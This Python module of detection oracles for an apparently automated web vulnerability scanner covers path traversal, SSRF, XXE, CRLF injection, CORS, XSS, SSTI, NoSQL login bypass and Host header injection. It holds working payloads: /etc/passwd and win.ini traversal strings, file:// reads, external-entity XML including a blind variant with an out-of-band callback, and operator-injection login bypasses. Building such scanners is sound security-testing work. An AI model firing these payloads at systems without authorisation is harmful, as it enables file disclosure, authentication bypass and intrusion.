"""Deterministic injection / redirection oracles — path traversal, open redirect,
SSRF, and XXE.

Same discipline as sqli_oracle: a finding is VALIDATED only by an objective,
reproducible signal (a file-content signature reflected back, a 3xx Location that
resolves off-origin, a fetched-URL echo), never by an LLM opinion or a template
match. Anything that merely *looks* suspicious but cannot be objectively
confirmed here is returned as a manual-confirm lead (validated=False upstream),
so recall stays honest and false positives do not get asserted as real.

Fast (short per-request timeout) and hang-proof. Most oracles here are fully
offline (in-band signals only): reflected file content, a 3xx Location that
resolves off-origin, a fetched-URL echo. The ONE exception is blind XXE
(:func:`plant_blind_xxe`), which is opt-in: it only runs when the caller supplies
an OAST correlation registry, mints a provenance-carrying callback token, and
leaves confirmation to that registry's out-of-band reconcile — no in-band guess
is ever asserted. This is what covers the real ginandjuice.shop shape: a parser
that resolves external entities but reflects nothing in-band (numeric-validated
fields, parameter entities refused), so the only proof is the out-of-band hit.
A blind SSRF that only performs an out-of-band request is likewise reported as a
lead unless an OAST callback confirms it.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx

# ---------------------------------------------------------------------------
# Path traversal (CWE-22 / LFI)
# ---------------------------------------------------------------------------
# Payloads walk up out of a served directory to a file that exists on every
# Linux/Windows host. Multiple encodings cover naive filters (raw, url-encoded,
# double-encoded, and the ....// filter-bypass).
_TRAVERSAL_PAYLOADS = (
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../../../windows/win.ini",
    "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
)
# Signatures that only appear in the real target file — objective proof the
# traversal resolved and the file was served back.
_TRAVERSAL_MARKERS = (
    "root:x:0:0",  # /etc/passwd first line
    "root:x:0:0:root",
    "daemon:x:1:1",  # /etc/passwd second line (defends against a partial
    "[extensions]",  # win.ini
    "[fonts]",  # win.ini
    "; for 16-bit app support",  # win.ini header comment
)
# Params that commonly name a file/path — used to prioritise, not restrict.
_FILE_PARAM_HINTS = (
    "file",
    "path",
    "page",
    "doc",
    "document",
    "name",
    "filename",
    "template",
    "download",
    "load",
    "read",
    "dir",
    "folder",
    "url",
    "src",
    "img",
    "image",
    "attachment",
    "report",
    "view",
    "include",
    "resource",
)


def _with_param(url: str, param: str, value: str) -> str:
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(u._replace(query=urlencode(q)))


async def detect_path_traversal(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """Inject traversal payloads into each candidate GET param AND, if the path
    ends in a file-like segment, into the trailing path segment. VALIDATED only if
    the response body carries a real system-file signature."""
    tried_params = list(params or [])
    if not tried_params:
        q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        tried_params = list(q) or [None]  # None => path-segment injection below

    # Order params so file-naming ones are tried first (cheaper time-to-signal).
    def _rank(p: Optional[str]) -> int:
        if p is None:
            return 1
        pl = p.lower()
        return 0 if any(h in pl for h in _FILE_PARAM_HINTS) else 2

    for param in sorted(tried_params, key=_rank):
        for payload in _TRAVERSAL_PAYLOADS:
            try:
                if param is None:
                    # inject into the last path segment
                    u = urlparse(url)
                    parts = u.path.rstrip("/").split("/")
                    parts[-1] = payload
                    target = urlunparse(u._replace(path="/".join(parts)))
                    r = await client.get(target)
                else:
                    target = _with_param(url, param, payload)
                    r = await client.get(target)
            except Exception:
                continue
            body = (r.text or "")[:4000]
            low = body.lower()
            if any(m.lower() in low for m in _TRAVERSAL_MARKERS):
                return {
                    "technique": "path_traversal",
                    "endpoint": url,
                    "parameter": param,
                    "payload": payload,
                    "http_status": r.status_code,
                    "file_excerpt": body[:200],
                    "proof": "response returned the contents of a system file outside the web root",
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# Open redirect (CWE-601)
# ---------------------------------------------------------------------------
# A sentinel origin we do NOT control but which is unmistakably off-target. If the
# app 3xx-redirects Location to this exact host, redirection is attacker-controlled.
_REDIRECT_SENTINEL = "https://osop-redirect-sentinel.example.net/pwn"
_REDIRECT_SENTINEL_HOST = "osop-redirect-sentinel.example.net"
_REDIRECT_PAYLOADS = (
    _REDIRECT_SENTINEL,
    "//osop-redirect-sentinel.example.net/pwn",
    "https:osop-redirect-sentinel.example.net/pwn",
    "/\\osop-redirect-sentinel.example.net/pwn",
)
_REDIRECT_PARAM_HINTS = (
    "url",
    "redirect",
    "redir",
    "next",
    "return",
    "returnto",
    "return_to",
    "returnurl",
    "goto",
    "dest",
    "destination",
    "continue",
    "to",
    "out",
    "target",
    "link",
    "forward",
    "callback",
    "redirect_uri",
)


async def detect_open_redirect(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
    allowlist_hints: Optional[List[str]] = None,
    **_ignore: Any,
) -> Optional[Dict[str, Any]]:
    """Inject an off-origin sentinel into redirect-like params. VALIDATED only if
    the server answers 3xx with a Location resolving to the sentinel host (not our
    target) — proving the redirect target is attacker-controlled.

    ``allowlist_hints`` are allow-listed URLs harvested from the target itself
    (e.g. redirect literals in its JS bundle). Many real redirectors guard the
    param with a *substring* allow-list; smuggling a hint as a query suffix of the
    sentinel (``https://<sentinel>/?x=<hint>``) passes the filter while the browser
    still lands on the sentinel host — the canonical allow-list bypass. The oracle
    only fires on a sentinel-host Location, so a hardened allow-list that truly
    redirects to the hint's host produces no false positive."""
    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    candidate_params = list(params or []) or list(q)
    # Prefer redirect-named params; if none exist, still try any present param.
    ranked = sorted(
        candidate_params,
        key=lambda p: 0 if any(h in p.lower() for h in _REDIRECT_PARAM_HINTS) else 1,
    )
    if not ranked:
        return None

    # Base payloads + allow-list-bypass variants built from harvested hints.
    payloads = list(_REDIRECT_PAYLOADS)
    for hint in (allowlist_hints or [])[:4]:
        if not hint:
            continue
        payloads.append(f"{_REDIRECT_SENTINEL}?x={hint}")  # sentinel host, hint as suffix
        payloads.append(f"https://{_REDIRECT_SENTINEL_HOST}/?x={hint}")
        payloads.append(f"https://{_REDIRECT_SENTINEL_HOST}/{hint}")

    # Follow_redirects MUST be off so we can read the raw Location header.
    for param in ranked:
        for payload in payloads:
            try:
                target = _with_param(url, param, payload)
                r = await client.get(target, follow_redirects=False)
            except Exception:
                continue
            if r.status_code not in (301, 302, 303, 307, 308):
                continue
            loc = r.headers.get("location") or r.headers.get("Location") or ""
            host = urlparse(
                loc if "://" in loc else "http:" + loc if loc.startswith("//") else loc
            ).netloc.lower()
            if _REDIRECT_SENTINEL_HOST in loc.lower() and _REDIRECT_SENTINEL_HOST in (
                host or loc.lower()
            ):
                return {
                    "technique": "open_redirect",
                    "endpoint": url,
                    "parameter": param,
                    "payload": payload,
                    "http_status": r.status_code,
                    "location": loc[:300],
                    "proof": "server issued a 3xx redirect to an attacker-controlled off-origin host",
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# SSRF (CWE-918) — reflected class only (offline-provable)
# ---------------------------------------------------------------------------
# We can only VALIDATE SSRF in-band when the fetched resource is echoed back. We
# point the app at a local file:// or at itself and look for the fetched content
# in the response. A blind SSRF (OOB-only) cannot be proven offline, so those
# candidates are returned as leads by the caller, not asserted.
_SSRF_PROBES = (
    ("file:///etc/passwd", _TRAVERSAL_MARKERS),
    ("file:///c:/windows/win.ini", ("[extensions]", "[fonts]")),
)
_SSRF_PARAM_HINTS = (
    "url",
    "uri",
    "link",
    "src",
    "source",
    "target",
    "dest",
    "fetch",
    "load",
    "image",
    "img",
    "avatar",
    "callback",
    "webhook",
    "feed",
    "proxy",
    "path",
    "download",
    "remote",
    "endpoint",
    "host",
    "site",
    "domain",
    "next",
    "data",
)


async def detect_ssrf_reflected(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """Point a URL-taking param at file:// and look for the fetched file content
    reflected in the response. VALIDATED only on that reflection — the strongest
    in-band SSRF signal available without an out-of-band collaborator."""
    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    candidate_params = list(params or []) or list(q)
    ranked = [p for p in candidate_params if any(h in p.lower() for h in _SSRF_PARAM_HINTS)]
    if not ranked:
        return None
    for param in ranked:
        for probe, markers in _SSRF_PROBES:
            try:
                target = _with_param(url, param, probe)
                r = await client.get(target)
            except Exception:
                continue
            low = (r.text or "")[:4000].lower()
            if any(m.lower() in low for m in markers):
                return {
                    "technique": "ssrf_reflected",
                    "endpoint": url,
                    "parameter": param,
                    "payload": probe,
                    "http_status": r.status_code,
                    "proof": "server fetched an attacker-supplied URI and reflected its contents",
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# XXE (CWE-611) — reflected file-read class only
# ---------------------------------------------------------------------------
# Classic external-entity file read. VALIDATED only if the parsed entity's file
# content comes back in the response. Only ever sent to endpoints that advertise
# XML handling (accepts/returns xml) so we do not spray XML at JSON APIs.
_XXE_FILES = (
    ("file:///etc/passwd", _TRAVERSAL_MARKERS),
    ("file:///c:/windows/win.ini", ("[extensions]", "[fonts]")),
)


def _xxe_body(file_uri: str, root: str = "osop", field: str = "data") -> str:
    """Build an external-entity file-read doc against a specific XML SCHEMA.

    Real XML endpoints validate the document against their own schema and reject
    a foreign root/field before the parser ever reflects the entity — so a fixed
    ``<osop><data>`` payload only ever confirms on a target that happens to accept
    that shape. Targeting the app's OWN root+field (discovered from a sample
    request, e.g. ginandjuice.shop's ``<stockCheck><productId>``) is what lets the
    entity reach a reflected field on a real target."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{file_uri}">]>'
        f"<{root}><{field}>&xxe;</{field}></{root}>"
    )


def _xxe_schemas_from_sample(sample_xml: Optional[str]) -> List[Tuple[str, str]]:
    """Derive (root_tag, first_child_tag) from a sample XML request body so the
    payload can be built against the app's real schema. Returns [] when no usable
    schema is found; the caller always also tries the generic <osop><data> shape."""
    if not sample_xml:
        return []
    import re as _re

    tags = _re.findall(r"<([A-Za-z_][\w.-]*)\b[^>]*>", sample_xml)
    # skip the XML declaration / DOCTYPE artifacts
    tags = [t for t in tags if t.lower() not in ("xml", "doctype")]
    if len(tags) >= 2:
        return [(tags[0], tags[1])]
    if len(tags) == 1:
        return [(tags[0], "data")]
    return []


async def detect_xxe(
    client: httpx.AsyncClient,
    url: str,
    *,
    method: str = "POST",
    sample_xml: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """POST an XML doc with an external-entity file read. VALIDATED only if the
    file signature is reflected in the response.

    When ``sample_xml`` (a legitimate request body captured from the target) is
    provided, the payload is ALSO built against the app's own root+field schema,
    not just the generic ``<osop><data>`` shape — the recall fix that lets this
    detect XXE on schema-validating endpoints like a stock-check API. Confirmation
    is unchanged: a real local-file signature must appear in the response, so a
    blind/OOB-only or entity-hardened parser still (correctly) does NOT confirm."""
    # Schemas to try: the app's own (from the sample) first, then the generic.
    schemas = _xxe_schemas_from_sample(sample_xml) + [("osop", "data")]
    attempts: List[Tuple[str, Tuple[str, ...], str, str]] = []
    for root, field in schemas:
        for file_uri, markers in _XXE_FILES:
            attempts.append((_xxe_body(file_uri, root, field), markers, root, field))

    for body, markers, root, field in attempts:
        try:
            r = await client.request(
                method,
                url,
                content=body,
                headers={"Content-Type": "application/xml", "Accept": "application/xml, */*"},
            )
        except Exception:
            continue
        low = (r.text or "")[:4000].lower()
        if any(m.lower() in low for m in markers):
            return {
                "technique": "xxe",
                "endpoint": url,
                "payload": f"external-entity file:// read via <{root}><{field}>",
                "http_status": r.status_code,
                "proof": (
                    "XML parser resolved an external entity and reflected a local "
                    f"file (schema <{root}><{field}>)"
                ),
                "confidence": 1.0,
            }
    return None


def _blind_xxe_bodies(callback_url: str, root: str, field: str) -> List[Tuple[str, str]]:
    """Build external-entity payloads that make the parser fetch ``callback_url``.

    Returns (label, body) pairs covering the two parsers seen in the wild:
      - ``system-entity``: a general external entity referenced in a data field.
        Works when general entities resolve (the common case).
      - ``param-entity``: the callback fetched from a *parameter* entity in the
        DTD. Covers parsers that block general entities in content but still
        expand parameter entities (a frequent half-measure).
    Both are built against the app's OWN ``root``/``field`` so a schema-validating
    endpoint still parses them."""
    return [
        (
            "system-entity",
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{callback_url}">]>'
            f"<{root}><{field}>&xxe;</{field}></{root}>",
        ),
        (
            "param-entity",
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE {root} [<!ENTITY % xxe SYSTEM "{callback_url}"> %xxe;]>'
            f"<{root}><{field}>1</{field}></{root}>",
        ),
    ]


async def plant_blind_xxe(
    client: httpx.AsyncClient,
    url: str,
    *,
    oast_registry: Any,
    engagement_id: str,
    method: str = "POST",
    sample_xml: Optional[str] = None,
    source_agent_id: str = "injection_scan",
) -> int:
    """Plant blind-XXE probes whose ONLY confirmation is an out-of-band callback.

    For the endpoint's own XML schema (derived from ``sample_xml`` when given,
    plus the generic shape), mint one provenance-carrying OAST token per payload
    and POST an external-entity document that makes the parser fetch the token's
    callback URL. This asserts NOTHING in-band — a finding is promoted only when
    :meth:`OASTCorrelationRegistry.reconcile` later captures the callback. That is
    the honest way to cover a parser that resolves entities but reflects nothing
    (the ginandjuice.shop stock-check shape).

    Returns the number of probes planted (payloads sent), for observability. The
    caller is responsible for calling ``reconcile()`` to collect confirmations.
    """
    if oast_registry is None:
        return 0
    schemas = _xxe_schemas_from_sample(sample_xml) + [("osop", "data")]
    planted = 0
    for root, field in schemas:
        for label, _tmpl in _blind_xxe_bodies("PLACEHOLDER", root, field):
            try:
                probe = await oast_registry.mint_probe(
                    engagement_id=engagement_id,
                    vuln_class="xxe",
                    injection_point=f"xml-body <{root}><{field}>",
                    payload=f"blind-xxe {label}",
                    request_summary=f"{method} {url}",
                    source_agent_id=source_agent_id,
                    label=f"xxe:{label}:{root}",
                )
            except Exception:
                continue
            if not probe.callback_url:
                continue
            # Rebuild the body with the real callback URL now that we have it.
            body = next(
                b for lb, b in _blind_xxe_bodies(probe.callback_url, root, field) if lb == label
            )
            try:
                await client.request(
                    method,
                    url,
                    content=body,
                    headers={"Content-Type": "application/xml", "Accept": "application/xml, */*"},
                )
                planted += 1
            except Exception:
                continue
    return planted


# ---------------------------------------------------------------------------
# CRLF injection / HTTP response splitting (CWE-113)
# ---------------------------------------------------------------------------
# We smuggle a CR-LF sequence followed by a sentinel header into a reflected
# request value (query param, or a redirect Location built from one). VALIDATED
# only if the server splits our payload into a REAL, separate response header
# carrying our unguessable marker — objective proof the value crossed the header
# boundary. A value that is echoed into the body but never becomes a header is
# not asserted (that is reflected-XSS territory, handled separately).
_CRLF_HEADER = "x-osop-crlf"


def _crlf_payloads(marker: str) -> Tuple[str, ...]:
    inj = f"{_CRLF_HEADER}: {marker}"
    return (
        f"%0d%0a{inj}",  # standard URL-encoded CRLF
        f"%0D%0A{inj}",  # upper-case hex
        f"value%0d%0a{inj}",  # CRLF after a benign value prefix
        f"%E5%98%8A%E5%98%8D{inj}",  # overlong-UTF8 CR/LF filter bypass
        f"\r\n{inj}",  # raw (some clients/servers pass it through)
    )


async def detect_crlf_injection(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """Inject a CRLF + sentinel-header sequence into each candidate GET param.
    VALIDATED only if the response comes back carrying our injected header with
    the exact unguessable marker — i.e. the value was split into the header
    section (HTTP response splitting / header injection)."""
    import os

    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    candidate_params = list(params or []) or list(q)
    if not candidate_params:
        return None
    marker = "osop" + os.urandom(6).hex()
    for param in candidate_params:
        for payload in _crlf_payloads(marker):
            try:
                target = _with_param(url, param, payload)
                r = await client.get(target, follow_redirects=False)
            except Exception:
                continue
            # httpx lower-cases header names; an injected header surfaces here only
            # if the server actually emitted it (the split succeeded).
            injected = r.headers.get(_CRLF_HEADER)
            if injected and marker in injected:
                return {
                    "technique": "crlf_injection",
                    "endpoint": url,
                    "parameter": param,
                    "payload": payload,
                    "http_status": r.status_code,
                    "injected_header": f"{_CRLF_HEADER}: {injected}"[:200],
                    "proof": "attacker-controlled value was split into a new response header (CRLF)",
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# CORS misconfiguration (CWE-942 — permissive cross-origin resource sharing)
# ---------------------------------------------------------------------------
# The exploitable case is a server that REFLECTS an arbitrary Origin into
# Access-Control-Allow-Origin *and* sets Access-Control-Allow-Credentials: true
# (or trusts the special `null` origin with credentials). That lets any attacker
# page read authenticated responses. A wildcard `*` WITHOUT credentials is the
# intended public-API pattern and is NOT flagged — precision over noise.
_CORS_SENTINEL_ORIGIN = "https://osop-cors-sentinel.example.net"


async def detect_cors_misconfig(
    client: httpx.AsyncClient,
    url: str,
    **_ignore: Any,
) -> Optional[Dict[str, Any]]:
    """Send an off-origin (and a `null`) Origin and confirm the server both
    REFLECTS it into Access-Control-Allow-Origin and allows credentials — the
    combination a browser will honour for a credentialed cross-site read."""
    for origin in (_CORS_SENTINEL_ORIGIN, "null"):
        try:
            r = await client.get(url, headers={"Origin": origin})
        except Exception:
            continue
        acao = (r.headers.get("access-control-allow-origin") or "").strip()
        acac = (r.headers.get("access-control-allow-credentials") or "").strip().lower()
        # Reflection of our exact origin (not a static wildcard) + credentials.
        if acao == origin and acac == "true":
            return {
                "technique": "cors_misconfig",
                "endpoint": url,
                "parameter": "Origin",
                "payload": f"Origin: {origin}",
                "http_status": r.status_code,
                "acao": acao,
                "acac": acac,
                "proof": (
                    "server reflected an attacker-controlled Origin into "
                    "Access-Control-Allow-Origin with Access-Control-Allow-Credentials:true"
                ),
                "confidence": 1.0,
            }
    return None


# ---------------------------------------------------------------------------
# Reflected XSS (CWE-79) — in-band, unencoded-HTML-reflection class only
# ---------------------------------------------------------------------------
# We inject a unique tag-shaped marker and VALIDATE only when it is reflected
# VERBATIM (angle brackets intact) inside an HTML response — i.e. the app writes
# attacker input into the HTML stream without encoding, the precondition for
# reflected XSS. If the marker comes back entity-encoded (&lt;osop…&gt;) or the
# response is not HTML, nothing is asserted. DOM-only XSS (never in the HTTP body)
# is out of scope here and is validated by the browser oracle instead.
_XSS_PARAM_HINTS = (
    "q",
    "query",
    "search",
    "s",
    "keyword",
    "term",
    "name",
    "message",
    "msg",
    "comment",
    "text",
    "title",
    "input",
    "value",
    "redirect",
    "return",
    "lang",
    "callback",
    "id",
    "page",
    "ref",
    "utm_source",
    "error",
    "email",
)


async def detect_reflected_xss(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """Inject a unique tag-shaped marker into each candidate GET param and confirm
    it is reflected UNENCODED into an HTML response body (raw `<...>` preserved)."""
    import os

    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    candidate_params = list(params or []) or list(q)
    if not candidate_params:
        return None
    # Rank hinted params first (cheaper time-to-signal), but try all.
    candidate_params = sorted(
        candidate_params,
        key=lambda p: 0 if any(h == p.lower() or h in p.lower() for h in _XSS_PARAM_HINTS) else 1,
    )
    for param in candidate_params:
        token = "osopxss" + os.urandom(5).hex()
        marker = f"<{token}>"  # a tag that no framework emits
        probe = f"\"'>{marker}"  # break out of attribute/tag first
        try:
            target = _with_param(url, param, probe)
            r = await client.get(target)
        except Exception:
            continue
        ctype = (r.headers.get("content-type") or "").lower()
        if "html" not in ctype:
            continue
        body = r.text or ""
        # VALIDATE only on verbatim (unencoded) reflection. If the app HTML-encoded
        # the angle brackets, the marker will not appear and we correctly stay quiet.
        if marker in body:
            return {
                "technique": "reflected_xss",
                "endpoint": url,
                "parameter": param,
                "payload": probe,
                "http_status": r.status_code,
                "proof": "attacker-supplied HTML tag was reflected unencoded into an HTML response",
                "confidence": 1.0,
            }
    return None


# ---------------------------------------------------------------------------
# Server-Side Template Injection (CWE-1336 / CWE-94) — arithmetic-eval oracle
# ---------------------------------------------------------------------------
# We inject a template expression whose value is a large, distinctive product.
# VALIDATED only when the server returns the COMPUTED product AND does not merely
# echo the literal expression — objective proof the input reached a template
# engine and was evaluated. The operands are chosen so their product is a number
# that will not appear by chance in a normal page, and we additionally require
# the raw `A*B` expression to be absent (an app that just reflects the payload,
# XSS-style, prints `7331*1223`, not `8965813`, so it never fires here).
_SSTI_A = 7331
_SSTI_B = 1223
_SSTI_PRODUCT = str(_SSTI_A * _SSTI_B)  # 8965813 — distinctive, unlikely by chance
_SSTI_EXPR = f"{_SSTI_A}*{_SSTI_B}"


def _ssti_payloads() -> Tuple[str, ...]:
    e = _SSTI_EXPR
    # Cover the mainstream engines: Jinja2/Twig ({{}}), Freemarker/JSP-EL (${}),
    # Ruby ERB (<%= %>), Thymeleaf/Spring-EL (#{}, *{}), Angular/Handlebars ({{}}).
    return (
        f"{{{{{e}}}}}",  # {{7331*1223}}
        f"${{{e}}}",  # ${7331*1223}
        f"#{{{e}}}",  # #{7331*1223}
        f"*{{{e}}}",  # *{7331*1223}
        f"<%= {e} %>",  # ERB
        f"{{{e}}}",  # {7331*1223}
        f"@({e})",  # Razor
    )


async def detect_ssti(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """Inject a template arithmetic expression into each candidate GET param.
    VALIDATED only when the response contains the evaluated product and not the
    raw expression — proving server-side template evaluation, not mere reflection."""
    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    candidate_params = list(params or []) or list(q)
    if not candidate_params:
        return None
    for param in candidate_params:
        for payload in _ssti_payloads():
            try:
                target = _with_param(url, param, payload)
                r = await client.get(target)
            except Exception:
                continue
            body = r.text or ""
            # The engine evaluated it only if the PRODUCT is present and the raw
            # expression is NOT (a plain reflector echoes `7331*1223`, never the
            # product). Guards against both "no template" and "reflected verbatim".
            if _SSTI_PRODUCT in body and _SSTI_EXPR not in body:
                return {
                    "technique": "ssti",
                    "endpoint": url,
                    "parameter": param,
                    "payload": payload,
                    "http_status": r.status_code,
                    "proof": (
                        f"template expression evaluated server-side "
                        f"({_SSTI_EXPR} rendered as {_SSTI_PRODUCT})"
                    ),
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# NoSQL injection (CWE-943) — authentication-bypass class (framework-agnostic)
# ---------------------------------------------------------------------------
# Mongo-style operator injection: replacing a credential value with an operator
# object (`{"$ne": null}`, `{"$gt": ""}`) makes an unsanitised query match the
# first user. VALIDATED objectively by a JWT-shaped session token that appears in
# the OPERATOR response but NOT in a benign-credentials control response — so an
# app that rejects operator objects (or issues no token) never fires.
_JWT_RE = None


def _jwt_in(text: str) -> bool:
    import re

    global _JWT_RE
    if _JWT_RE is None:
        _JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
    return bool(_JWT_RE.search(text or ""))


_NOSQL_LOGIN_FIELDS = (("email", "password"), ("username", "password"), ("user", "pass"))
_NOSQL_OPERATORS = ({"$ne": None}, {"$gt": ""}, {"$ne": ""})


async def detect_nosql_auth_bypass(
    client: httpx.AsyncClient,
    url: str,
    *,
    login_fields: Optional[Tuple[str, str]] = None,
) -> Optional[Dict[str, Any]]:
    """POST operator-injection objects to a login-like JSON endpoint. VALIDATED
    only when the operator payload yields a JWT the benign control did not — an
    objective authentication bypass, not a status-code guess."""
    field_sets = [login_fields] if login_fields else list(_NOSQL_LOGIN_FIELDS)
    for user_f, pass_f in field_sets:
        # Control: a bogus, well-formed credential pair must NOT authenticate.
        control = {user_f: "osop_nouser@example.invalid", pass_f: "osop-not-a-real-pw"}
        try:
            rc = await client.post(url, json=control)
        except Exception:
            continue
        if _jwt_in(rc.text or ""):
            # Endpoint hands a token to anyone — not a NoSQLi signal, bail (no FP).
            continue
        for op in _NOSQL_OPERATORS:
            payload = {user_f: op, pass_f: op}
            try:
                r = await client.post(url, json=payload)
            except Exception:
                continue
            if r.status_code == 200 and _jwt_in(r.text or ""):
                return {
                    "technique": "nosql_auth_bypass",
                    "endpoint": url,
                    "parameter": f"{user_f}/{pass_f}",
                    "payload": f'{{"{user_f}": {op}, "{pass_f}": {op}}}',
                    "http_status": r.status_code,
                    "proof": (
                        "operator-injection object authenticated (session token issued) "
                        "where valid-shaped credentials were rejected"
                    ),
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# Host header / X-Forwarded-Host injection (CWE-644)
# ---------------------------------------------------------------------------
# An app that trusts the Host (or X-Forwarded-Host) header when building absolute
# URLs — password-reset links, redirects, canonical tags — lets an attacker point
# those URLs at their own host (poisoned reset links, cache poisoning). VALIDATED
# only when our sentinel host is reflected into a URL context (a 3xx Location or
# an absolute `scheme://sentinel` URL in the body), never on a bare echo.
_HHI_SENTINEL = "osop-hhi-sentinel.example.net"


async def detect_host_header_injection(
    client: httpx.AsyncClient,
    url: str,
    **_ignore: Any,
) -> Optional[Dict[str, Any]]:
    """Send a spoofed Host (then X-Forwarded-Host) and confirm the sentinel host
    is reflected into a URL the app emits — a Location redirect or an absolute URL
    in the body. A server that pins its own domain never fires."""
    for header in ("Host", "X-Forwarded-Host"):
        try:
            r = await client.get(url, headers={header: _HHI_SENTINEL}, follow_redirects=False)
        except Exception:
            continue
        loc = (r.headers.get("location") or "").lower()
        body = (r.text or "")[:8000].lower()
        in_location = _HHI_SENTINEL in loc
        # In the body it must be part of a URL (scheme:// or //host), not a bare
        # word — so a page that merely prints the header value is not flagged.
        in_body_url = f"//{_HHI_SENTINEL}" in body or f"://{_HHI_SENTINEL}" in body
        if in_location or in_body_url:
            return {
                "technique": "host_header_injection",
                "endpoint": url,
                "parameter": header,
                "payload": f"{header}: {_HHI_SENTINEL}",
                "http_status": r.status_code,
                "location": (r.headers.get("location") or "")[:300],
                "reflected_in": "location" if in_location else "body_url",
                "proof": (
                    f"attacker-controlled {header} header was reflected into an "
                    "absolute URL the application emitted"
                ),
                "confidence": 1.0,
            }
    return None


if __name__ == "__main__":
    # Self-check against a local target. These oracles do NOT assert a finding on
    # juice-shop (it is not path-traversal/open-redirect/SSRF/XXE vulnerable on the
    # probed surface) — the check just proves they run clean and hang-proof.
    import asyncio
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

    async def _main():
        async with httpx.AsyncClient(verify=False, timeout=10) as c:
            for name, coro in (
                ("path_traversal", detect_path_traversal(c, target + "/ftp/quarantine")),
                ("open_redirect", detect_open_redirect(c, target + "/redirect?to=x")),
                ("ssrf", detect_ssrf_reflected(c, target + "/profile/image/url?url=x")),
            ):
                try:
                    ev = await asyncio.wait_for(coro, timeout=30)
                except Exception as e:
                    ev = f"error:{e}"
                print(f"{name:16s} -> {ev}")

    asyncio.run(_main())
    print("OK: injection oracles ran clean")
